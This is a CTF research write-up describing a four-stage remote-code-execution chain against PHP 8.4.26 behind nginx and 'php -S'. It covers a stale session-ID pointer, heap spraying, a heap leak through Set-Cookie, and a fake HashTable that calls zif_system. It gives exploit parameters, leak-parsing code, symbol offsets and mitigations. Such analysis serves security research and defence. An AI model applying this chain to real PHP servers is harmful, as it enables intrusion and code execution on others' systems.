# 06 — RCE chain: nginx → `php -S` (stealmybitcoin.com CTF)

This document records the exploit chain developed against the CTF target
`stealmybitcoin.com` — a realistic `nginx → php -S 127.0.0.1:PORT` deployment
running PHP 8.4.26. The chain builds on the `PS(id)` stale pointer primitive
described in doc 05.

The CTF was solved by LiveOverflow (hextree.io) before this chain was
completed. The analysis below reflects the state of independent research at
the time the competition ended.

---

## 6.1 Target configuration

```
nginx (edge, ~1 MB body limit) → php -S 127.0.0.1:<port>
PHP 8.4.26, cli-server SAPI, single process
memory_limit (effective): low enough for 4096 B OOM to fire
session.upload_progress.enabled = On   (default)
session.upload_progress.cleanup  = On   (default)
```

Key difference from the Apache lab: `php -S` is **single-process**. There is no
worker rotation; every request executes in the same process, so heap state
from request A survives directly into request B.

---

## 6.2 Four-stage chain

```
A1  cheap-OOM  → stale PS(id) at known heap address
B1  heap spray → fake zend_string header at PS(id) → OOB Set-Cookie read
A2  cheap-OOM  → dangling PS(http_session_vars) 
B2  fake HashTable + pDestructor = zif_system → RCE
```

Stages A2 and B2 mirror the Apache exploit (`exploit.py` in `php2shell`).
This document focuses on A1→B1 (the parts specific to CLI and the second CVE).

---

## 6.3 Stage A1 — triggering the stale pointer

### Body parameters (100 % stable)

```python
build_body(
    parts=874, depth=64, fillers=0,
    sid=b'a',                    # non-null first byte — required (see §6.4)
    progress=b'k0',
    fillers128=30,
    progress_last=True,
    progress_before_file=True,
    with_file=True,
    file_last=True,
)
```

### Observed result (GDB, ASLR off)

```
fatal=4096  cookie=False  id=0x7fffed1fe000  sc=1  st=2
```

- `fatal=4096` — OOM at the `smart_string_appendc` 4 096 B allocation inside
  `php_session_send_cookie()`.
- `sc=1` — `PS(send_cookie) = 1` after OOM.
- `id=0x7fffed1fe000` — stale `PS(id)` non-null.

### Heap geometry

```python
chunk_base = stale_id & ~0x1fffff  # 0x7fffed000000
page_idx   = (stale_id - chunk_base) >> 12  # 0x1fe
```

The entire 27-chunk reservation spans `0x7fffec800000–0x7fffefe00000`.

---

## 6.4 Stage B1 — OOB heap read via forged `zend_string`

### Why `sid=b'\x00'` fails (the critical bug)

Using `PHPSESSID = b'\x00'` (null byte) sets `PS(id)->val[0] = '\x00'`.
After A1's cleanup, that byte may still be in freed ZMM memory. In B1's
`php_session_initialize()`:

```c
if (!PS(id) || !ZSTR_VAL(PS(id))[0])   /* TRUE when val[0] == '\0' */
    PS(id) = PS(mod)->s_create_sid(...); /* stale pointer discarded */
```

The OOB read never fires. Fix: `sid=b'a'` (or any non-null byte).

### Why `A:page` forge items are insufficient

`forge_value(page=0x1fe)` creates a `0x1fd008`-byte value that lands in some
free ZMM chunk. With only N copies, the specific chunk `0x7fffed000000` may
not receive one. The result is `200 OK` with no Set-Cookie.

### The correct spray: `G:511:0x1fe`

`forge_fill_value(pages=511, page=0x1fe)` creates a value of:
```
L = 511 * 4096 - 25 = 0x1fefe7 bytes   (≤ ZEND_MM_MAX_LARGE_SIZE = 0x1ff000)
```
This fills all 511 usable pages of the receiving chunk. The fake header is
written at `hdr = page * 0x1000 - 0x1018 = 0x1fcfe8` from data start, placing
it at `chunk + 0x1018 + 0x1fcfe8 = chunk + 0x1fe000` — **regardless of which
chunk the item lands in**. Send enough items to cover all ~27 free chunks
(≈ 27 × 2 MB ≈ 54 MB body; only feasible locally — for the live target, body
limit is ~1 MB, so a different approach is needed).

### B1 body spec

```python
# local lab (no size limit)
spec = ("G:511:0x1fe " * 30).strip()

# live target (≤ 1 MB): target the specific chunk via small-alloc pre-fill
# to drain competing chunks, then use A:0x1fe items
spec = ("A:0x1fe " * N).strip()
```

### Trigger — `MULTIPART_EVENT_END`

No file-upload field is required. With `session.upload_progress.cleanup=1`
(default), `MULTIPART_EVENT_END` always calls `php_session_rfc1867_cleanup()`
→ `php_session_initialize()` → `php_session_reset_id()` →
`php_session_send_cookie()`. This fires **after** all forge fields are
allocated.

Sequence of events inside `php_hash_environment()` for B1:

```
MULTIPART_EVENT_FORMDATA  PHPSESSID=a            → progress->sid set
MULTIPART_EVENT_FORMDATA  PHP_SESSION_UPLOAD_PROGRESS=k0  → progress->key set
MULTIPART_EVENT_FORMDATA  forge field 1..N       → G:511:0x1fe allocs fill ZMM chunks
MULTIPART_EVENT_END
  → php_session_rfc1867_cleanup()
    → php_session_initialize()
      → php_session_reset_id()
        → php_session_send_cookie()
            reads ZSTR_LEN(PS(id))  = fake_len   ← our forge value
            reads ZSTR_VAL(PS(id))  = heap memory starting at PS(id)+0x18
            → Set-Cookie: PHPSESSID=<URL-encoded heap bytes>
```

### Parsing the leak

```python
import struct, urllib.parse

dec = urllib.parse.unquote_to_bytes(cookie_value.decode('latin1'))
# first 8-byte word pointing into a 2 MB-aligned range → heap pointer
# common pointer in the window → zval_ptr_dtor (libphp base)
# deduce: libphp_base = zdtor - dtor_offset
#         zif_system  = libphp_base + zif_offset
```

Offsets for x86-64 PHP 8.4.26:

| Symbol | Offset from libphp base |
|---|---|
| `zval_ptr_dtor` | `0x65EB60` |
| `zif_system` | `0x465370` |

---

## 6.5 Stages A2 + B2 — execution

After recovering `libphp_base` and `main_chunk` from B1:

- **A2**: second cheap-OOM leaves `PS(http_session_vars)` dangling
  (same mechanism as A1 but targeting the session vars array).
- **B2**: `mk_ht.py` builds a fake `HashTable` at a known address `S` with
  `pDestructor = zif_system`. `fake_ref_b.py` sends a body that places a
  fake `zend_reference` pointing to `S`. When PHP frees the reference, it
  calls `pDestructor(cmd)` = `zif_system(cmd)`.

The A2/B2 pair is lifted directly from the Apache exploit (`exploit.py` in
`php2shell`). The only CLI-specific parameter is the main-chunk address
derived from the B1 leak.

---

## 6.6 What the solver did differently

Based on LiveOverflow's public note ("super reliable fast exploit"):

- The `BG(serialize)` path (doc 01) and the `PS(id)` path (doc 05/06) are
  two separate CVEs. The solve relied on CVE-2026-109619 (`PS(id)` chain).
- The solver likely arrived at the correct `session.upload_progress.cleanup`
  trigger and `G:511:page` spray without the two bugs that delayed this
  analysis (`sid=b'\x00'` and `A:page`).
- The CTF note from the organiser: the server had a wallet-branch WIF, not
  the funded-address WIF. The solver got credited for first and only
  successful `print-flag` execution with exfiltration.

---

## 6.7 Lessons for future CLI-server targets

1. **`php -S` is not safer than Apache** for this class of bug — single-process
   means heap state is perfectly preserved across requests.
2. **Probe the OOM size, not just the presence.** `fatal=4096` (fixed-size
   `smart_string` slab) is the `PS(id)` trigger; `fatal=<variable>` near the
   filename length is the `BG(serialize)` trigger. They require different B
   bodies.
3. **`sid` must be non-null.** Any null-byte session ID causes
   `php_session_initialize()` to discard the stale pointer.
4. **`G:511:page` dominates `A:page`.** The full-chunk fill ensures the fake
   header exists in every chunk the spray reaches, regardless of which one
   the ZMM assigns.
5. **`session.upload_progress.cleanup=Off`** is an independent mitigation
   knob: it prevents `php_session_rfc1867_cleanup()` from firing at END,
   removing the B1 trigger without disabling upload progress entirely.
